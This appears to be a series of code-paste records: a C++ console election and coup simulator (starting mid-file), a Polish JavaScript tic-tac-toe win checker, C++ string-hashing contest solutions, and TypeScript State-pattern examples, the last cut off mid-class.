        premprename = cannames[primeministernum];
    }
    if(cannames[primeministernum] == pcannames[primeministernum])
    {
        premprename = cannames[primeministernum];
    } else
    {
        premprename = pcannames[primeministernum];
    }

}

void converttoint()
{
    for(int i=0; i!=5; i++)
    {
        par_percent_int[i] = (int)(par_percent[i]*100);
        par_votes_int[i] = (int)par_votes[i];
    }
}

void restart()
{
    president = par_name[presidentnum];
    primeminister = par_name[primeministernum];
    opposition = par_name[oppositionnum];
    plurality =0;
    pluralvotes =0;



    if(people < 30 && people > 10 && primeministernum != 6)
    {
        intervals -= 3/(people/10);
    } else if(people <=10 && primeministernum != 6)
    {
        intervals += people/10;
    }


    pefav = trending;
    for(int i=0; i!=5; i++)
    {
        popularity[i] = par_percent[i];
    }



    for(int i=0; i!=5; i++)
    {
        isnew[i] = false;
        if(rand()%100 > par_percent_int[i] && par_seats_int[i] <= (seats*0.10))
        {
            par_name[i] = allparties[i][rand()%9];
            isnew[i] = true;
            prevseats[i] = 0;
            prevpercent[i] = 0;
            canyear[i] = year;
            indivgen(i);
            shiftcomp(i);
            p_auth[i] = (rand()%10) -(5+(abs(i-3)*2));
            pflags[i] = (rand()%minumpol)+i;
            friendly[i] = (rand()%20)-10;
        }
    }


    par_name[presidentnum] = president;
    par_name[primeministernum] = primeminister;
    par_name[oppositionnum] = opposition;

    int mf = rand()%10;
    int polyear = startyear;


    for(int i=0; i!=5; i++)
    {
        prevseats[i] = par_seats_int[i];
        prevpercent[i] = par_percent_int[i];
    }

    int b = rand()%100;
    if(b < par_percent_int[presidentnum])
    {
        cannames[presidentnum] = pname;
        pflags[presidentnum] = (rand()%minumpol)+presidentnum;
    } else
    {
        indivgen(presidentnum);
        pflags[presidentnum] = (rand()%minumpol)+presidentnum;
    }

    for(int i=0; i!=5; i++)
    {

         par_coal[i]=0;
 par_seats[i]=0;
 par_seats_int[i]=0;

 par_votes[i] =10;
 par_votes_int[i] =0;

 par_percent[i] =0;
 par_percent_int[i] =0;


 totalvotes =0;

 pres_votes =0;


govper=0;
oppoper =0;
indeper=0;
govmembers=0;
 gmem[i] =0;
 govseats =0;

 oppomembers =0;
 omem[i] =0;
 opposeats =0;

 indepmembers =0;
 imem[i] =0;
 indepseats =0;

 av_correspond =0;

    }


    if(primeministernum != 6 && intervals < 1)
    {
        intervals = 1;
    }
}


void updates()
{
    int mf = rand()%10;
    int polyear = startyear;
    if(junta == true && rand()%100 < year - juntayear)
    {
        junta = false;
    }

    if(junta == true)
    {
        people += (year - presyear)/10;
    }

    if(rand()%15 < (year-trendyear))
    {
        trending = rand()%4;
        trendyear = year;
    }
    for(int i=0; i!= intervals; i++)
    {
        updateauth();
        bbcupdate();
        ecupdate();
        mupdate();
    }

    for(int i=0; i!=5; i++)
    {
        int s = rand()%100;
        if(s > (par_percent_int[i] - (year-canyear[i]))- p_auth[i])
    {
        if(rand()%100 < par_percent_int[i])
        {
            cannames[i] = pcannames[i];
            pflags[i] = (rand()%minumpol)+i;
            shiftcomp(i);
            p_auth[i] = (rand()%10) -(5+(abs(i-3)*2));
        } else
        {
            canyear[i] = year;
        indivgen(i);
        pflags[i] = (rand()%minumpol)+i;
        shiftcomp(i);
        p_auth[i] = (rand()%10) -(5+(abs(i-3)*2));
        friendly[i] = (rand()%20)-10;
        }
    }
    }
    for(int i=0; i!=5; i++)
    {
        int v = rand()%100;
        if(v > par_percent_int[i] - (year-pcanyear[i]))
    {
        pcanyear[i] = year;
        pmindivgen(i);
    }
    }


    if(rand()%50 < year - polyear)
    {
        polyear = year;
        switch(mf)
        {
        case 1:
            pfloat = 0.20;
        case 2:
            pfloat = 0.25;
        case 3:
            pfloat = 0.30;
        case 4:
            pfloat = 0.35;
        case 5:
            pfloat = 0.40;
        case 6:
            pfloat = 0.45;
        case 7:
            pfloat = 0.50;
        case 8:
            pfloat = 0.55;
        case 9:
            pfloat = 0.60;
        case 10:
            pfloat = 0.65;
        default:
            break;
        }
    }

    if(primeministernum == presidentnum)
    {
        if(rand()%100 < par_percent_int[primeministernum]*0.75)
        {
            cannames[presidentnum] = pcannames[primeministernum];
        }
    }

}


void calcdif()
{

     int difference = ((year - startyear)/10) +2;
 seats += rand()%difference;
 if(totalvotes - prevtot <=0)
 {
     float tdif = (float)totalvotes, ttot = (float) prevtot;
     tdif = tdif /totalvotes;
     seats = round(seats*tdif);
 } else
 {
     float tdif = (float)totalvotes, ttot = (float) prevtot;
     tdif = (tdif-ttot) /totalvotes;
     seats = round(seats * tdif);
 }

}


void dispall()
{
    int lowerhouse =0;
    for(int i=0; i!=5; i++)
    {
        lowerhouse += lhgains[i];
    }
    int upperhouse = 0;
    for(int i=0; i!=5; i++)
    {
        upperhouse += par_seats_int[i] - lhgains[i];
    }
    for(int i =0; i!=5; i++)
    {
        cout << ""======================================"" << endl;
        if(cannames[i] == pcannames[i])
        {
            cout << cannames[i] << "" - "" << par_name[i] << "" ("" << par_acro[i] << "")\n"" << par_votes_int[i] << "" ("" << par_percent_int[i] << ""% | "";
        } else
        {
            cout << cannames[i] << "" / "" << pcannames[i] << "" - "" << par_name[i] << "" ("" << par_acro[i] << "")\n"" << par_votes_int[i] << "" ("" << par_percent_int[i] << ""% | "";
        }
        if(isnew[i] != true)
        {
            if(par_percent_int[i] >= prevpercent[i])
        {
            cout << ""+"" << par_percent_int[i] - prevpercent[i] << ""%)"" << endl;
        }else
        {
            cout << par_percent_int[i] - prevpercent[i] << ""%)"" << endl;
        }
        } else
        {
            if(par_percent_int[i] >= prevpercent[i])
            {
            cout << ""+"" << par_percent_int[i] - prevpercent[i] << ""%) - NEW"" << endl;
            }else
            {
                cout << par_percent_int[i] - prevpercent[i] << ""%) - NEW"" << endl;
            }
        }


        for(int b=0; b< par_percent_int[i]; b++)
        {
            cout << ""|"";
        }
        cout << ""\nTotal Seats Won: "" << par_seats_int[i] << "" (US: "" << par_seats_int[i] - lhgains[i] << "" | LS: "" << lhgains[i] << "" | "";

        if(isnew[i] != true)
        {
            if(par_seats_int[i] >= prevseats[i])
        {
            cout << ""+"" << par_seats_int[i] - prevseats[i] << "")"" << endl;
        }else
        {
            cout << par_seats_int[i] - prevseats[i] << "")"" << endl;
        }
        } else
        {
            if(par_seats_int[i] >= prevseats[i])
            {
            cout << ""+"" << par_seats_int[i] - prevseats[i] << "") - NEW"" << endl;
            }else
            {
                cout << par_seats_int[i] - prevseats[i] << "") - NEW"" << endl;
            }
        }
        cout << ""FLAGSHIP POLICY: "" << flags[pflags[i]] << endl;


    }
}

int main()
{
    srand(time(NULL));
    //cngen();
    shiffty = (rand()%3)*5;

    for(int i=0; i!=5; i++)
    {
        indivgen(i);
        pflags[i] = (rand()%minumpol)+i;
        pmindivgen(i);
        p_auth[i] = (rand()%10) -(5+(abs(i-3)*2));
        friendly[i] = (rand()%20)-10;
    }
    policy = ((rand()%13) *5)+35;
        pfloat = (float) policy/100;
    ofstream presfile;
presfile.open(""Presidents.txt"");
    presfile << ""FILE SCCUESSFULLY CREATED"" << endl;
    presfile.close();
    ofstream pmfile;
pmfile.open(""Premieres.txt"");
    pmfile << ""FILE SCCUESSFULLY CREATED"" << endl;
    pmfile.close();

    ofstream erecord;
erecord.open(""Elections.txt"");
    erecord << ""FILE SCCUESSFULLY CREATED"" << endl;
    erecord.close();

    trending = rand()%5;

    game:
        system(""CLS"");
    cout << ""Votes are being counted..."" << endl;
    for(int i=0; i< ((year - startyear)/10)+10; i++)
    {
        count_total();
        for(int b=0; b!=5; b++)
        {
            av_correspond =b;
            par_votes[b] += add_votes();
        }
        count_total();
        vcalc();
    converttoint();


    system(""CLS"");
    if(midterm == true)
    {
        cout << year << "" Parliamentary Elections Opinion Polls:"" << endl;
    } else
    {
        cout << year << "" General Elections Opinion Polls:"" << endl;
    }
            cout << ""President: "" << pname << ""(""<< president << "")"" << endl;
            cout << ""Prime Minister: "" << pmname << ""(""<< primeminister << "")""  << endl;
            cout << ""Opposition: "" << pcannames[oppositionnum] << ""(""<< opposition << "")""  << endl;
            cout << endl;
            /*int lowerhouse = round(seats * pfloat);
    int upperhouse = round(seats - lowerhouse);
            cout << ""Seats Last Election: "" << seats << endl;
            cout << ""-Upper House: "" << upperhouse << endl;
            cout << ""-Lower House: "" << lowerhouse << endl;*/
        for(int i =0; i!=5; i++)
    {
        cout << ""======================================"" << endl;
        if(cannames[i] == pcannames[i])
        {
            cout << cannames[i] << "" - "" << par_name[i] << "" ("" << par_acro[i] << "")\n"" << par_votes_int[i] << "" ("" << par_percent_int[i] << ""%)"" << endl;
        }else
        {
            cout << cannames[i] << "" / "" << pcannames[i] << "" - "" << par_name[i] << "" ("" << par_acro[i] << "")\n"" << par_votes_int[i] << "" ("" << par_percent_int[i] << ""%)"" << endl;
        }

        for(int b=0; b< par_percent_int[i]; b++)
        {
            cout << ""|"";
        }

        cout << endl;
        cout << ""FLAGSHIP POLICY: "" << flags[pflags[i]] << endl;
    }
    //std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    system(""CLS"");
    prevtot = totalvotes;
    count_total();
    vcalc();
    converttoint();
    calcdif();
    countplural();
    if(fair == true)
    {
        dsdhondt();
    }else
    {
        discont();
    }
    seatcalc();



    if(midterm == true)
    {
        cout << year << "" Parliamentary Elections"" << endl;
    } else
    {
        cout << year << "" General Elections"" << endl;
    }
    calsplu();
    if(midterm == false)
    {
        prescalc();
        //cout << ""elected Pres"" << endl;
    } else if(midterm == true)
    {
        gmem[0] = presidentnum;
    govseats += par_seats_int[presidentnum];
    govper += par_percent_int[presidentnum];
    govmembers++;
    //cout << ""Appointed Gov"" << endl;
    }


    countplural();
    //cout << ""counted plurality"" << endl;
    coalitionform();
    //cout << ""formed coalitions"" << endl;
    pmcalc();
    //cout << ""Appointed PM"" << endl;
    if(junta == false && fair == false && rand()%(year - startyear) < (year - presyear) && govmembers < 4 && p_auth[presidentnum] >=1)
    {
        fair = true;
    }else if(junta == false && fair == false && rand()%10 < (year-presyear) && govseats == 0|| president != primeminister && p_auth[presidentnum] >=1)
    {
        fair = true;
    }
    /*if(presidentnum == primeministernum && govmembers == 4 && par_seats[presidentnum] > seats * 0.75 && fair == true && rand()%100 < popularity[presidentnum] *100)
    {
        fair = false;
    }*/

    if(fair == true && presidentnum == primeministernum && govseats > opposeats *2 && rand()%seats < par_seats_int[presidentnum] && totauth < -10 && p_auth[presidentnum]<=0)
    {
        fair = false;
    }
    cout << endl;
int lowerhouse =0;
    for(int i=0; i!=5; i++)
    {
        lowerhouse += lhgains[i];
    }
    int upperhouse = 0;
    for(int i=0; i!=5; i++)
    {
        upperhouse += par_seats_int[i] - lhgains[i];
    }
    /*cout << ""Calculated House"" << endl;
    system(""CLS"");
    if(midterm == true)
    {
        cout << year << "" Parliamentary Elections"" << endl;
    } else
    {
        cout << year << "" General Elections"" << endl;
    }*/
    cout << ""President: "" << pname << ""(""<< par_name[presidentnum] << "")"" << endl;
    cout << ""Prime Minister: "" << pmname << ""(""<< par_name[primeministernum] << "")""  << endl;
    cout << ""Opposition: "" << pcannames[oppositionnum] << ""(""<< par_name[oppositionnum] << "")""  << endl;
    cout << ""\nFlagship Policy: "" << flags[pflags[presidentnum]];
    if(primeministernum != presidentnum && flags[pflags[primeministernum]] != flags[pflags[presidentnum]] && primeministernum != 6)
    {
        cout << "" And "" << flags[pflags[primeministernum]];
    }
    cout << endl;
    cout << ""\nTotal Seats: "" << upperhouse + lowerhouse;
    cout << "" (Upper Seats: "" << upperhouse;
    cout << "" | Lower Seats: "" << lowerhouse << "")"" <<endl;

    float gfloat = govseats;
    float ofloat = opposeats;
    float ifloat = indepseats;
    seats = upperhouse + lowerhouse;
    cout << ""Composition:"" << endl;
    if(govseats >0)
    {
        cout << ""Government: "" << govseats << "" Seats ("" << round((gfloat/seats)*100)  << ""% | ""<< round((gfloat/(seats-indepseats))*100) << ""%)""<< endl;
        cout << ""Members: "";
        for(int i=0; i!=govmembers; i++)
        {
            cout << par_name[gmem[i]];
            if(i != govmembers-1)
            {
                cout << "", "";
            }
        }
    }
    if(opposeats > 0)
    {
        cout << ""\n=====\nOpposition: "" << opposeats<< "" Seats ("" << round((ofloat/seats)*100) << ""% | ""<< round((ofloat/(seats-indepseats))*100) << ""%)"" << endl;
        for(int i=0; i!=oppomembers; i++)
        {
            cout << par_name[omem[i]];
            if(i != oppomembers-1)
            {
                cout << "", "";
            }
        }
    }

    if(indepseats > 0)
    {
        cout << ""\n=====\nBoycotting: "" << indepseats<< "" Seats ("" << round((ifloat/seats)*100)  << ""%)"" << endl;
        for(int i=0; i!=indepmembers; i++)
        {
            cout << par_name[imem[i]];
            if(i != indepmembers-1)
            {
                cout << "", "";
            }
        }
    }
    cout << endl;

    pecheck();
    covalues();
    mchange();
    pshift();
    cout << ""\nMilitary Status: "";
    switch(military/10)
    {
    case 1:
        cout << ""General Dissatisfaction"" << endl;
        break;
    case 2:
        cout << ""Discontent Among Lower Ranks"" << endl;
        break;
    case 3:
        cout << ""Divided"" << endl;
        break;
    case 4:
        cout << ""Slight Disagreements"" << endl;
        break;
    case 5:
        cout << ""Low Support for Government"" << endl;
        break;
    case 6:
        cout << ""Apolitical Military"" << endl;
        break;
    case 7:
        cout << ""Generally Supportive"" << endl;
        break;
    case 8:
        cout << ""Secretly Endorses the Government"" << endl;
        break;
    case 9:
        cout << ""Open Military Endorsement"" << endl;
        break;
    case 10:
        cout << ""Fanatically Loyal"" << endl;
    break;
    case 0:
        cout << ""Strained Relations with the Government"" << endl;
        break;
    case -1:
        cout << ""Officers Openly Denouncing Government"" << endl;
        break;
    case -2:
        cout << ""Generally Disloyal Army"" << endl;
        break;
    case -3:
        cout << ""Small Outbreaks of Mutinies"" << endl;
        break;
    case -4:
        cout << ""Officers Leading Mutinies"" << endl;
        break;
    case -5:
        cout << ""Widespread Military Defections"" << endl;
        break;
        default:
            if(military < 0)
            {
                cout << ""Military Coup Imminent"" << endl;
            } else
            {
                cout << ""Fanatically Loyal"" << endl;
            }

            break;
    }

    //cout << ""Military-backed Party: "" << par_name[milfav] << endl;
    //cout << ""Military-opposed Party: "" << par_name[milenem] << endl;
    cout << ""National Status: "";
    switch(people/10)
    {
    case 10:
    case 9:
        cout << ""Nationwide Support"" << endl;
        break;
    case 8:
    case 7:
    case 6:
    case 5:
        cout << ""Supportive Populace"" << endl;
        break;
    case 4:
    case 3:
    case 2:
    case 1:
        cout << ""Indifferent People"" << endl;
        break;
    case 0:
    case -1:
        cout << ""Divided"" << endl;
        break;
    case -2:
    case -3:
        cout << ""General Discontent"" << endl;
        break;
    case -4:
    case -5:
    case -6:
    case -7:
        cout << ""Widespread Protests"" << endl;
        break;
    case -8:
    case -9:
    default:
        if(people < 0)
        {
            cout << ""Nationwide Riots"" << endl;
        } else
        {
            cout << ""Nationwide Support"" << endl;
        }
        break;
    }

    cout << ""Economic Status: "";
    switch(economy/10)
    {
    case 10:
    case 9:
    case 8:
    case 7:
        cout << ""Booming"" << endl;
        break;
    case 6:
    case 5:
    case 4:
    case 3:
        cout << ""Expanding"" << endl;
        break;
    case 2:
    case 1:
    case 0:
    case -1:
        cout << ""Contracting"" << endl;
        break;
    case -2:
    case -3:
    case -4:
    case -5:
        cout << ""Recession"" << endl;
        break;
    case -6:
    case -7:
    case -8:
    case -9:
        cout << ""Depression"" << endl;
        break;
    default:
        cout << ""Booming"" << endl;
        break;
    }
    cout << ""  Freedom Level: "";
    switch(totauth/10)
    {
    case 10:
    case 9:
        cout << ""High"" << endl;
        break;
    case 8:
    case 7:
    case 6:
    case 5:
        cout << ""Above Average"" << endl;
        break;
    case 4:
    case 3:
    case 2:
    case 1:
    case 0:
    case -1:
        cout << ""Average"" << endl;
        break;
    case -2:
    case -3:
    case -4:
    case -5:
        cout << ""Below Average"" << endl;
        break;
    case -6:
    case -7:
    case -8:
    case -9:
        cout << ""Low"" << endl;
        break;
    default:
        if(totauth < 0)
        {
            cout << ""Low"" << endl;
        } else
        {
            cout << ""High"" << endl;
        }
        break;
    }

    cout << ""Militancy Level: "";
    switch(militancy/10)
    {
    case 10:
    case 9:
        cout << ""None"" << endl;
        break;
    case 8:
    case 7:
    case 6:
    case 5:
        cout << ""Nothing Significant"" << endl;
        break;
    case 4:
    case 3:
    case 2:
    case 1:
    case 0:
    case -1:
        cout << ""Low Militancy"" << endl;
        break;
    case -2:
    case -3:
    case -4:
    case -5:
        cout << ""Some Militancy"" << endl;
        break;
    case -6:
    case -7:
    case -8:
    case -9:
        cout << ""Abundant Militancy"" << endl;
        break;
    default:
        if(militancy < 0)
        {
            cout << ""Abundant Militancy"" << endl;
        } else
        {
            cout << ""None"" << endl;
        }
        break;
    }
    //cout << ""People-backed Party: "" << par_name[pefav] << endl;
    //cout << ""People-opposed Party: "" << par_name[penem] << endl;

    //cout << tseats << endl;
    //cout << remaining << endl;
//    cout << ""DEBUG: "" << totalvotes << endl;
//cout << presidentnum << endl;
//cout << oppositionnum << endl;

    /*erecord.open(""Elections.txt"", fstream::app);
        if(midterm == false)
        {
            erecord << year << "" GENERAL ELECTIONS"" << endl;
            erecord << ""WINNERS:"" << endl;
            if(presidentnum == primeministernum)
            {
                erecord << ""President & Prime Minister: "" << cannames[presidentnum] << "" ("" << par_name[presidentnum] << "") - "" << par_percent_int[presidentnum] << ""%"" << endl;
            } else
            {
                erecord << ""President: "" << cannames[presidentnum] << "" ("" << par_name[presidentnum] << "") - "" << par_percent_int[presidentnum] << ""%""  << endl;
                erecord << ""Prime Minister: "" << cannames[primeministernum] << "" ("" << par_name[primeministernum] << "") - "" << par_percent_int[primeministernum] << ""%"" << endl;
            }
            erecord << ""\n=========="" << endl;
        } else
        {

            erecord << year << "" MIDTERM ELECTIONS"" << endl;
            erecord << ""WINNER:"" << endl;
            erecord << ""Prime Minister: "" << cannames[primeministernum] << "" ("" << par_name[primeministernum] << "") - "" << par_percent_int[primeministernum] << ""%"" << endl;
            erecord << ""\n=========="" << endl;


        }
        erecord.close();*/

        if(midterm == true)
        {
            midterm = false;
        } else if(midterm == false)
        {
            midterm = true;
        }
        //cout << ""A"" << endl;
    if(fair == false)
    {
        intervals = par_percent_int[presidentnum] /10;
    intervals = (rand()%intervals)+1;
        intervals = intervals *1.5;
    }
    //cout << ""M"" << endl;

    intervals -= totauth/50;
    if(fair == true && totauth >= 0)
    {
        intervals = 2;
    }
    //cout << ""O"" << endl;

    if(govseats < opposeats || govseats + opposeats < indepseats )
    {
        intervals = 0;
        midterm = false;
        if(presidentnum == milfav)
        {
            military -= 20;
        } else if(presidentnum == milenem)
        {
            military += 10;
        } else
        {
            military -=10;
        }

        if(presidentnum == pefav)
        {
            people -= 20;
        } else if(presidentnum == penem)
        {
            people += 10;
        } else
        {
            people -=10;
        }
    }
    //cout << ""G"" << endl;

    /*cout << ""ECONOMY: "" << economy << endl;
    if(boom)
    {
        cout << ""BOOM ENDS IN "" << year + shiffty << endl;
    }*/



    tvts = 0;
    for(int i=0; i!=5; i++)
    {
        tvts+= par_votes_int[i];
    }
    //cout << ""U"" << endl;
    cout << ""\nVoter Turnout This Election: "" << tvts << endl;
    //cout << ""Person Represented Per Seat: "" << tvts/seats << endl;
    cout << ""Voter-to-Seat Ratio: "" << tvts/seats+1 << "" : 1"" << endl;
    if(primeministernum != 6 && intervals < 1)
    {
        intervals =1;
    }
    if(primeministernum == 6)
    {
        intervals =0;
    }
    cout << ""\nNext Election: "" << year + intervals << endl;

    if(year+intervals >= 2023)
    {
        ofstream presfile;
        presfile.open(""Presidents.txt"", fstream::app);
        presfile << presprename << "" ("" << prevpres << "") "" << presyear << "" - CURRENT"" << endl;
        presfile.close();
        presyear = year;
        prevpres = par_name[presidentnum];
        presprename = cannames[presidentnum];


        ofstream pmfile;
        pmfile.open(""Premieres.txt"", fstream::app);
        pmfile << premprename << "" ("" << prevprem << "") "" << premyear << "" - CURRENT"" << endl;
        pmfile.close();
        premyear = year;
        prevprem = par_name[primeministernum];
        premprename = cannames[primeministernum];
    }
    cout << ""\nInput 1 to show full election results"" << endl;
    cin >> userinput;
    if(userinput == ""1"")
    {
        dispall();
        cin >> userinput;
    }


    updates();
    coupcheck();
    if(ot == false)
    {
            revcheck();
    }

    year += intervals;
    restart();
    goto game;
}
"
XgmCtdfi,Funkcja Sprawdz Wygrana,drakon-firestone,JavaScript,Friday 11th of August 2023 04:27:48 AM CDT,"function sprawdzWygrana() {
  licznikTur++;
  if (
    przyciski[0].textContent == przyciski[1].textContent &&
    przyciski[1].textContent == przyciski[2].textContent &&
    przyciski[1].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (
    przyciski[3].textContent == przyciski[4].textContent &&
    przyciski[3].textContent == przyciski[5].textContent &&
    przyciski[4].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (
    przyciski[6].textContent == przyciski[7].textContent &&
    przyciski[7].textContent == przyciski[8].textContent &&
    przyciski[7].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (
    przyciski[0].textContent == przyciski[3].textContent &&
    przyciski[3].textContent == przyciski[6].textContent &&
    przyciski[3].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (
    przyciski[1].textContent == przyciski[4].textContent &&
    przyciski[4].textContent == przyciski[7].textContent &&
    przyciski[4].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (
    przyciski[2].textContent == przyciski[5].textContent &&
    przyciski[5].textContent == przyciski[8].textContent &&
    przyciski[5].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (
    przyciski[0].textContent == przyciski[4].textContent &&
    przyciski[4].textContent == przyciski[8].textContent &&
    przyciski[8].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (
    przyciski[2].textContent == przyciski[4].textContent &&
    przyciski[4].textContent == przyciski[6].textContent &&
    przyciski[4].textContent != """"
  ) {
    console.log(""zwycięstwo"");
  } else if (licznikTur == 9) {
    info.textContent = ""remis!"";
  }
}"
B16422kr,I,Salvens,C++,Friday 11th of August 2023 04:22:39 AM CDT,"#include <algorithm>
#include <iostream>
#include <array>
#include <vector>
#include <numeric>
#include <random>
#include <chrono>


using namespace std;

//#define int long long
#pragma comment(linker,""/STACK:1000000000,1000000000"")

const long long INF = 1e9 + 7;
const int MAXN = 1e6 + 1000;
const int N = 1e5 + 10;

const int M1 = 1e9 + 123;
const int M2 = 1e9 + 321;
int P1 = 22811;
int P2 = 22699;

array<int, MAXN> power1, power2;

inline void init_pow() {
    power1[0] = 1;
    power2[0] = 1;
    for (int i = 1; i < MAXN; ++i) {
        power1[i] = (1ll * power1[i - 1] * P1) % M1;
        power2[i] = (1ll * power2[i - 1] * P2) % M2;
    }
}

inline void build_hash(vector<int>& s, vector<pair<int, int>>& h) {
    int n = s.size();
    h.resize(n + 1);
    h[0].first = 0;
    h[0].second = 0;

    for (int i = 0; i < n; ++i) {
        h[i + 1].first = (h[i].first + 1ll * s[i] * power1[i]) % M1;
        h[i + 1].second = (h[i].second + 1ll * s[i] * power2[i]) % M2;
    }
}

inline bool is_equal(vector<pair<int, int>>& h_l, vector<pair<int, int>>& h_r, int start1, int start2, int len) {
    pair<int, int> d_l, d_r;
    d_l.first = ((h_l[start1 + len].first - h_l[start1].first + M1) % M1 * 1ll * power1[start2]) % M1;
    d_l.second = ((h_l[start1 + len].second - h_l[start1].second + M2) % M2 * 1ll * power2[start2]) % M2;

    d_r.first = ((h_r[start2 + len].first - h_r[start2].first + M1) % M1 * 1ll * power1[start1]) % M1;
    d_r.second = ((h_r[start2 + len].second - h_r[start2].second + M2) % M2 * 1ll * power2[start1]) % M2;

    return d_l == d_r;
}

inline int random_key(const int before, const int after) {
    auto seed = std::chrono::high_resolution_clock::now().time_since_epoch().count();
    std::mt19937 mt_rand(seed);
    int base = std::uniform_int_distribution<int>(before + 1, after)(mt_rand);
    return base;
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);

    P1 = random_key(256, M1);
    P2 = random_key(256, M2);

    int n, m;
    cin >> n >> m;
    vector<int> a(n), b(n);
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
        b[i] = a[i];
    }
    reverse(b.begin(), b.end());


    vector<pair<int, int>> h_a, h_b;
    init_pow();
    build_hash(a, h_a);
    build_hash(b, h_b);


    for (int i = n / 2 - 1; i < n; ++i) {
        int len = n - i - 1;
        if (is_equal(h_b, h_a, n - i - 1, i + 1, len)) {
            cout << i + 1 << ' ';
        }
    }
}"
5bFN65BB,G,Salvens,C++,Friday 11th of August 2023 04:19:29 AM CDT,"#include <algorithm>
#include <iostream>
#include <array>
#include <vector>
#include <numeric>
#include <random>
#include <chrono>


using namespace std;

#define int long long
#pragma comment(linker,""/STACK:1000000000,1000000000"")

const long long INF = 1e9 + 7;
const int MAXN = 2e5 + 1000;
const int N = 1e5 + 10;

const int M1 = 1e9 + 123;
const int M2 = 1e9 + 321;
int P1 = 22811;
int P2 = 22699;
array<int, MAXN> power1, power2;

void init_pow() {
    power1[0] = 1;
    power2[0] = 1;
    for (int i = 1; i < MAXN; ++i) {
        power1[i] = (power1[i - 1] * P1) % M1;
        power2[i] = (power2[i - 1] * P2) % M2;
    }
}

void build_hash(string& s, vector<pair<int, int>>& h) {
    int n = s.size();
    h.resize(n + 1);
    h[0].first = 0;
    h[0].second = 0;

    for (int i = 0; i < n; ++i) {
        h[i + 1].first = (h[i].first + s[i] * power1[i]) % M1;
        h[i + 1].second = (h[i].second + s[i] * power2[i]) % M2;
    }
}

pair<int, int> get_hash(vector<pair<int, int>>& h, int pos, int len, int mx_pow = 0) {
    int h1 = h[pos + len].first - h[pos].first;
    int h2 = h[pos + len].second - h[pos].second;
    if (h1 < 0) {
        h1 += M1;
    }
    if (h2 < 0) {
        h2 += M2;
    }
    if (mx_pow != 0) {
        h1 = h1 * power1[mx_pow - (pos + len - 1)] % M1;
        h2 = h2 * power2[mx_pow - (pos + len - 1)] % M2;
    }
    return make_pair(h1, h2);
}

bool is_equal(vector<pair<int, int>>& h_l, vector<pair<int, int>>& h_r, int start1, int start2, int len) {
    pair<int, int> d_l, d_r;
    d_l.first = ((h_l[start1 + len].first - h_l[start1].first + M1) % M1 * power1[start2]) % M1;
    d_l.second = ((h_l[start1 + len].second - h_l[start1].second + M2) % M2 * power2[start2]) % M2;

    d_r.first = ((h_r[start2 + len].first - h_r[start2].first + M1) % M1 * power1[start1]) % M1;
    d_r.second = ((h_r[start2 + len].second - h_r[start2].second + M2) % M2 * power2[start1]) % M2;

    return d_l == d_r;
}

int random_key(const int before, const int after) {
    auto seed = std::chrono::high_resolution_clock::now().time_since_epoch().count();
    std::mt19937 mt_rand(seed);
    int base = std::uniform_int_distribution<int>(before + 1, after)(mt_rand);
    return base;
}

int sum(int a, int k, int mod) {
    if (k == 1) {
        return 1;
    } else if (k % 2 == 0) {
        return (1ll + a) * sum(1ll * a * a % mod, k / 2, mod) % mod;
    } else {
        return 1 + (a + 1ll) * a % mod * sum(1ll * a * a % mod, k / 2, mod) % mod;
    };
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);

    P1 = random_key(256, M1);
    P2 = random_key(256, M2);

    string a;
    cin >> a;
    int n = a.size();
    reverse(a.begin(), a.end());


    vector<pair<int, int>> h_a;
    init_pow();
    build_hash(a, h_a);

    int ans = 0;
    for (int len = 1; len <= n; ++len) {
        auto h1 = h_a[len];
        auto h2 = h_a[n];

        h1.first = 1ll * h1.first * sum(power1[len], n, M1) % M1;
        h2.first = 1ll * h2.first * sum(power1[n], len, M1) % M1;

        h1.second = 1ll * h1.second * sum(power2[len], n, M2) % M2;
        h2.second = 1ll * h2.second * sum(power2[n], len, M2) % M2;

        ans += (h1 == h2);
    }
    cout << ans << '\n';
}"
RQkvgFfa,State | Dev/Env Example,Idanref,TypeScript,Friday 11th of August 2023 04:09:07 AM CDT,"interface EnvironmentState {
  getDatabaseConnectionString(): string;
  logError(error: string): void;
}

class DevelopmentState implements EnvironmentState {
  getDatabaseConnectionString(): string {
    return ""mongodb://localhost:27017/development-db"";
  }

  logError(error: string): void {
    console.log(""[DEBUG]:"", error);
  }
}

class ProductionState implements EnvironmentState {
  getDatabaseConnectionString(): string {
    return ""mongodb://production-server:27017/production-db"";
  }

  logError(error: string): void {
    // Logging error to a monitoring service in production
    console.log(""[ERROR]:"", error);
  }
}

class ConfigurationManager {
  private state: EnvironmentState;

  constructor(env: string) {
    if (env === ""development"") {
      this.state = new DevelopmentState();
    } else if (env === ""production"") {
      this.state = new ProductionState();
    } else {
      throw new Error(""Invalid environment"");
    }
  }

  getDatabaseConnectionString(): string {
    return this.state.getDatabaseConnectionString();
  }

  logError(error: string): void {
    this.state.logError(error);
  }
}

const devConfig = new ConfigurationManager(""development"");
console.log(devConfig.getDatabaseConnectionString()); // Output: mongodb://localhost:27017/development-db
devConfig.logError(""This is a development error""); // Output: [DEBUG]: This is a development error

const prodConfig = new ConfigurationManager(""production"");
console.log(prodConfig.getDatabaseConnectionString()); // Output: mongodb://production-server:27017/production-db
prodConfig.logError(""This is a production error""); // Output: [ERROR]: This is a production error
"
LviybZ9q,State | Traffic Light Example,Idanref,TypeScript,Friday 11th of August 2023 04:02:49 AM CDT,"interface TrafficLightState {
  proceed(): void;
  next(light: TrafficLight): void;
}

class RedState implements TrafficLightState {
  proceed(): void {
    console.log(""STOP! The light is Red."");
  }

  next(light: TrafficLight): void {
    light.changeState(new GreenState());
  }
}

class YellowState implements TrafficLightState {
  proceed(): void {
    console.log(""Be CAREFUL! The light is Yellow."");
  }

  next(light: TrafficLight): void {
    light.changeState(new RedState());
  }
}

class GreenState implements TrafficLightState {
  proceed(): void {
    console.log(""GO! The light is Green."");
  }

  next(light: TrafficLight): void {
